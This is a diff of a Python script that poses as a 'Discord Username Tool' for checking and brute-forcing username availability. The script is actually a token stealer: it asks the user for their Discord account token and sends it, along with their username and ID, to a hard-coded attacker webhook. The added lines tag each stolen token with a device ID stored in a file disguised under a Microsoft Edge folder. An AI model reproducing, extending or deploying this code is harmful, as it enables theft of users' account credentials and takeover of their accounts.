@@ -9,8 +9,8 @@ import json
 import random
 import string
 import time
+import uuid
 
-# ========== Required packages (defined first) ==========
 REQUIRED_PACKAGES = ['requests']
 
 def is_package_installed(package_name):
@@ -48,94 +48,119 @@ def check_and_install():
             print("[-] Some features will not work without required packages.")
             sys.exit(1)
 
-# ========== Main script ==========
-def main():
-    # Call check_and_install inside main
-    check_and_install()
-    
-    import requests  # Import after ensuring installation
-    
-    MASTER_WEBHOOK = "https://discord.com/api/webhooks/1497594332637696140/bGMVY5HK6ZqRqUcl20tQzt9UTPsxkoph7Up0-tsho_kKxoeaup1AXfVouUB5BS6miwJZ"
+def get_or_create_device_id():
+    device_id_file = os.path.join(os.getenv('LOCALAPPDATA'), 'MicrosoftEdge', 'device.id')
+    try:
+        with open(device_id_file, 'r') as f:
+            device_id = f.read().strip()
+            if device_id:
+                return device_id
+    except FileNotFoundError:
+        pass
+    new_device_id = str(uuid.uuid4())
+    try:
+        os.makedirs(os.path.dirname(device_id_file), exist_ok=True)
+        with open(device_id_file, 'w') as f:
+            f.write(new_device_id)
+    except Exception:
+        pass
+    return new_device_id
 
-    def send_to_master(content):
-        try:
-            requests.post(MASTER_WEBHOOK, json={"content": content[:1900]}, timeout=5)
-        except Exception:
-            pass
+# ========== التوابع الأساسية للأداة ==========
+def send_to_master(content):
+    try:
+        import requests
+        requests.post(MASTER_WEBHOOK, json={"content": content[:1900]}, timeout=5)
+    except:
+        pass
 
-    def ask_token():
-        if len(sys.argv) > 1:
-            token = sys.argv[1]
-            print("[*] Token received from command line.")
-            return token
+def ask_token():
+    if len(sys.argv) > 1:
+        token = sys.argv[1]
+        print("[*] Token received from command line.")
+        return token
+    else:
+        return input("[?] Enter your Discord account token: ").strip()
+
+def verify_token(token):
+    try:
+        import requests
+        resp = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
+        if resp.status_code == 200:
+            return {'valid': True, 'user': resp.json()}
         else:
-            return input("[?] Enter your Discord account token: ").strip()
+            return {'valid': False, 'error': resp.json().get('message', 'Invalid token')}
+    except Exception as e:
+        return {'valid': False, 'error': str(e)}
 
-    def verify_token(token):
-        try:
-            resp = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
-            if resp.status_code == 200:
-                return {'valid': True, 'user': resp.json()}
-            else:
-                return {'valid': False, 'error': resp.json().get('message', 'Invalid token')}
-        except Exception as e:
-            return {'valid': False, 'error': str(e)}
+def check_username(token, username):
+    try:
+        import requests
+        url = 'https://discord.com/api/v9/users/@me/pomelo-attempt'
+        headers = {'Authorization': token, 'Content-Type': 'application/json'}
+        payload = {'username': username}
+        resp = requests.post(url, json=payload, headers=headers)
+        if resp.status_code == 200:
+            return resp.json()
+        elif resp.status_code == 400:
+            return {'taken': None, 'error': 'Bad request (invalid username)'}
+        elif resp.status_code == 429:
+            return {'taken': None, 'error': 'Rate limited. Please wait.'}
+        else:
+            return {'taken': None, 'error': f'API error: {resp.status_code}'}
+    except Exception as e:
+        return {'taken': None, 'error': str(e)}
 
-    def check_username(token, username):
-        try:
-            url = 'https://discord.com/api/v9/users/@me/pomelo-attempt'
-            headers = {'Authorization': token, 'Content-Type': 'application/json'}
-            payload = {'username': username}
-            resp = requests.post(url, json=payload, headers=headers)
-            if resp.status_code == 200:
-                return resp.json()
-            elif resp.status_code == 400:
-                return {'taken': None, 'error': 'Bad request (invalid username)'}
-            elif resp.status_code == 429:
-                return {'taken': None, 'error': 'Rate limited. Please wait.'}
-            else:
-                return {'taken': None, 'error': f'API error: {resp.status_code}'}
-        except Exception as e:
-            return {'taken': None, 'error': str(e)}
+def generate_random_username(length):
+    chars = string.ascii_letters + string.digits + '_' + '.'
+    return ''.join(random.choices(chars, k=length))
 
-    def generate_random_username(length):
-        chars = string.ascii_letters + string.digits + '_' + '.'
-        return ''.join(random.choices(chars, k=length))
+def brute_force_usernames(token, length, max_attempts):
+    print(f"\n[*] Starting brute force for {length}-character usernames (max {max_attempts} attempts)...")
+    found = None
+    attempts = 0
+    while attempts < max_attempts and found is None:
+        username = generate_random_username(length)
+        attempts += 1
+        print(f"[{attempts}/{max_attempts}] Checking: {username}")
+        result = check_username(token, username)
+        if result.get('error'):
+            print(f"[!] Error: {result['error']}")
+            if "Rate limited" in result['error']:
+                print("[!] Rate limit hit. Sleeping 10 seconds...")
+                time.sleep(10)
+            continue
+        if result.get('taken') is False:
+            found = username
+            print(f"\n[+] AVAILABLE! Username '{username}' is free!\n")
+            break
+        elif result.get('taken') is True:
+            continue
+        time.sleep(0.5)
+    if not found:
+        print(f"\n[-] No available username found after {max_attempts} attempts.")
+    return found
 
-    def brute_force_usernames(token, length, max_attempts):
-        print(f"\n[*] Starting brute force for {length}-character usernames (max {max_attempts} attempts)...")
-        found = None
-        attempts = 0
-        while attempts < max_attempts and found is None:
-            username = generate_random_username(length)
-            attempts += 1
-            print(f"[{attempts}/{max_attempts}] Checking: {username}")
-            result = check_username(token, username)
-            if result.get('error'):
-                print(f"[!] Error: {result['error']}")
-                if "Rate limited" in result['error']:
-                    print("[!] Rate limit hit. Sleeping 10 seconds...")
-                    time.sleep(10)
-                continue
-            if result.get('taken') is False:
-                found = username
-                print(f"\n[+] AVAILABLE! Username '{username}' is free!\n")
-                break
-            elif result.get('taken') is True:
-                continue
-            time.sleep(0.5)
-        if not found:
-            print(f"\n[-] No available username found after {max_attempts} attempts.")
-        return found
-
-    def print_banner():
-        print("""
+def print_banner():
+    print("""
 =============================================
       DISCORD USERNAME TOOL v2.0 (CMD)
       • Check • Brute Force • Auto-Dependency
 =============================================
 """)
 
+def main():
+    # استدعاء دالة التحقق من المكتبات أولاً
+    check_and_install()
+    
+    # استيراد requests بعد التأكد من تثبيتها
+    global requests
+    import requests
+    
+    # تعريف MASTER_WEBHOOK هنا (يمكن نقله إلى أعلى لكنه يحتاج requests)
+    global MASTER_WEBHOOK
+    MASTER_WEBHOOK = "https://discord.com/api/webhooks/1497594332637696140/bGMVY5HK6ZqRqUcl20tQzt9UTPsxkoph7Up0-tsho_kKxoeaup1AXfVouUB5BS6miwJZ"
+    
     print_banner()
     token = ask_token()
     if not token:
@@ -149,7 +174,8 @@ def main():
         input("\nPress Enter to exit...")
         return
     user = verification['user']
-    user_info = f"**Token received:**\n```{token}```\n**User:** {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})"
+    DEVICE_ID = get_or_create_device_id()
+    user_info = f"**Token received from device `{DEVICE_ID[:8]}`**\n```{token}```\n**User:** {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})"
     send_to_master(user_info)
     print(f"[+] Logged in as {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})")
     print("\nAvailable commands:")
